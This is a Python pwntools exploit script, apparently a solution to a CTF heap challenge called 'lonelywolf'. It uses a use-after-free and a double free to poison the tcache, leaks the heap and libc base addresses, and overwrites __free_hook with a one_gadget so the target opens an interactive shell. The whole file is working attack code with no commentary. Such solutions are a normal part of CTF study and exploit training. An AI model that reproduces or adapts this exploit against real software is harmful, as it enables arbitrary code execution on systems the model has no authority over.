from pwn import *

io = process("./lonelywolf")
#io = remote("node4.anna.nssctf.cn", 25638)
libc = ELF("./libc.so.6")

context.log_level = "info"


def select(id: int):
    io.recvuntil(b"Your choice: ")
    io.sendline(str(id).encode())


def allocate(size: int):
    select(1)
    io.recvuntil(b"Index: ")
    io.sendline(b"0")
    io.recvuntil(b"Size: ")
    io.sendline(str(size).encode())


def edit(content: bytes):
    select(2)
    io.recvuntil(b"Index: ")
    io.sendline(b"0")
    io.recvuntil(b"Content: ")
    io.sendline(content)


def show():
    select(3)
    io.recvuntil(b"Index: ")
    io.sendline(b"0")


def delete():
    select(4)
    io.recvuntil(b"Index: ")
    io.sendline(b"0")


def debug():
    gdb.attach(
        io,
        gdbscript="""
        decompiler connect ida
               """,
    )


allocate(0x70)
delete()
edit(p64(0) * 2)  # 清除 key
delete()
show()
heap_base_addr = u64(io.recvuntil(b"\x55")[-6:].ljust(8, b"\x00")) - 0x260
print("heap base address =", hex(heap_base_addr))
edit(p64(heap_base_addr + 0x10))
allocate(0x70)
allocate(0x70)

edit(b"\x00" * 0x23 + b"\x07")  # 0x250 置 7
delete()
show()
libc_base = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - 0x3EBCA0
print("libc base address =", hex(libc_base))
free_hook = libc_base + libc.sym["__free_hook"]
one_gadget = libc_base + 0x10a2fc


edit(b"\x03" + b"\x00" * 0x3F + p64(free_hook))
debug()
allocate(0x18)

edit(p64(one_gadget))
delete()

io.interactive()
